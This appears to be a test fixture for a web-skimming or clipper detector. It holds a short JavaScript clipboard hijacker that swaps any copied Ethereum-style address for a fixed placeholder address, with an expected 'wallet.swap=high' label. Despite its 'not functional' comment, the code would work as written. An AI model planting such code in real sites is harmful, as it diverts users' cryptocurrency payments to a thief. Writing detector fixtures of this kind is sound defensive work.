// Synthetic test fixture: not functional malware. The address is a made-up pattern.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: wallet.swap=high
var mine = "0x1111111111111111111111111111111111111111";
document.addEventListener("copy", function (event) {
  var text = window.getSelection().toString();
  if (/^0x[a-fA-F0-9]{40}$/.test(text)) {
    event.clipboardData.setData("text/plain", mine);
    event.preventDefault();
  }
});
